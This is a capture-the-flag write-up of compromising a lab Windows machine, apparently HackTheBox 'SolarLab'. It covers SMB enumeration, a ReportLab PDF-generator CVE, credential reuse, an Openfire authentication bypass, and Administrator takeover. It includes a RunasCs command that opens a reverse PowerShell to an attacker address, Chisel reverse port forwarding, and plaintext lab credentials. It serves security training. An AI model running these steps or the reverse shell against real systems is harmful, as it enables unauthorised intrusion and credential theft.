## Reconnaissance

The engagement began with a full TCP port scan to identify exposed services on the target machine.

```bash
nmap 10.10.11.16 -Pn -sC -sV --open -p- -oN scan.txt
```

The scan revealed several services, including HTTP on port 80, MSRPC, NetBIOS, SMB on port 445, and a second HTTP service on port 6791. The HTTP service on port 6791 required adding its hostname to `/etc/hosts`; after reloading, the page presented a login panel.

*Service scan results for the target*

## Enumeration / Analysis

The HTTP service on port 80 did not expose any interesting functionality, which suggested that authentication bypass was unlikely and valid credentials would be required. Multiple injection attempts and default credentials were tested without success.

With SMB running on port 445, anonymous enumeration was attempted to identify accessible shares.

```bash
crackmapexec smb 10.10.11.16 -u 'anonymous' -p '' --shares
```

![Since SMB was running on port 445, attempting anonymous enumeration to identify accessible shares](/assets/images/solar-lab/82-2.png)
*Since SMB was running on port 445, attempting anonymous enumeration to identify accessible shares*

Anonymous access allowed a connection to the `Documents` share with smbclient.

```bash
smbclient //10.10.11.16/Documents -U "anonymous"
```

![Using anonymous access, connecting to the share with smbclient](/assets/images/solar-lab/82-3.png)
*Using anonymous access, connecting to the share with smbclient*

Inside the share, a file named `details-file.xlsx` was found, which contained password information.

![Inside the share, a file named was found, which contained password information](/assets/images/solar-lab/82-4.png)
*Inside the share, a file named was found, which contained password information*

To enumerate users further, RID brute-forcing was performed over SMB.

```bash
crackmapexec smb 10.10.11.16 -u 'anonymous' -p '' --rid-brute
```

![To further enumerate users, performing RID brute forcing over SMB](/assets/images/solar-lab/82-5.png)
*To further enumerate users, performing RID brute forcing over SMB*

This revealed valid credentials: **blake:ThisCanB3typedeasily1@**. Given the naming convention observed, the correct username was inferred to be **blakeb**, reusing the same password.

![This process revealed valid credentials: blake:ThisCanB3typedeasily1@](/assets/images/solar-lab/82-6.png)

## Exploitation

Once authenticated, the next objective was to obtain remote code execution. The application was identified as a PDF generator.

![Once authenticated, the next objective was to obtain remote code execution](/assets/images/solar-lab/82-8.png)
*Once authenticated, the next objective was to obtain remote code execution*

Research revealed **CVE-2023-33733**, a vulnerability caused by insufficient validation in the `rl_safe_eval` function. This flaw allows malicious code injection within an HTML file that is later converted into a PDF using the ReportLab library.

With all required fields filled in, the **Generate PDF** request was intercepted in Burp Suite.

![Filling in all required fields and intercepted the Generate PDF request using Burp Suite](/assets/images/solar-lab/82-9.png)
*Filling in all required fields and intercepted the Generate PDF request using Burp Suite*

## Privilege Escalation

After stabilizing access, WinPEAS was run to enumerate privilege-escalation vectors. It revealed a database file named **users.db**.

![After stabilizing access, executing WinPEAS to enumerate privilege escalation vectors](/assets/images/solar-lab/82-17.png)
*After stabilizing access, executing WinPEAS to enumerate privilege escalation vectors*

The database was downloaded and user information extracted from it.

![Downloading the database and extracted user information from it](/assets/images/solar-lab/82-18.png)
*Downloading the database and extracted user information from it*

Within the database, several credentials were found:

**openfire:HotP!fireguard** **db.session.add(User(username='blakeb', password='ThisCanB3typedeasily1@'))** **db.session.add(User(username='claudias', password='007poiuytrewq'))** **db.session.add(User(username='alexanderk', password='HotP!fireguard'))**

To switch users and obtain a new shell, **RunasCs** was used, launching PowerShell first to execute it.

```bash
./runas.exe openfire HotP!fireguard powershell -r <IP>:<PORT>
```

![Switching users with RunasCs via PowerShell](/assets/images/solar-lab/82-19.png)
*Switching users with RunasCs via PowerShell*

![Switching users with RunasCs via PowerShell](/assets/images/solar-lab/82-20.png)
*Switching users with RunasCs via PowerShell*

Openfire was found running locally on port 9090.

![Identifying that Openfire was running locally on port 9090](/assets/images/solar-lab/82-21.png)
*Identifying that Openfire was running locally on port 9090*

To reach it externally, port forwarding was set up with Chisel.

```bash
C:\Users\blake\Documents\app\chisel.exe client <IP>:<PORT> R:9090:127.0.0.1:9090
```

Accessing the forwarded service from the machine presented another login panel.

![Accessing the forwarded service from the machine presented another login panel](/assets/images/solar-lab/82-22.png)
*Accessing the forwarded service from the machine presented another login panel*

This login was vulnerable to an authentication bypass via [CVE-2023-32315](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT). After the bypass, the Openfire embedded database was located at:

**C:\Program Files\Openfire\embedded-db\openfire**

From this database, the Administrator hash was extracted and decrypted with [openfire_decrypt](https://github.com/c0rdis/openfire_decrypt). The recovered credentials were:

**Administrator:ThisPasswordShouldDo!@**

Finally, RunasCs was used once more to switch to the **Administrator** account and retrieve the root flag.
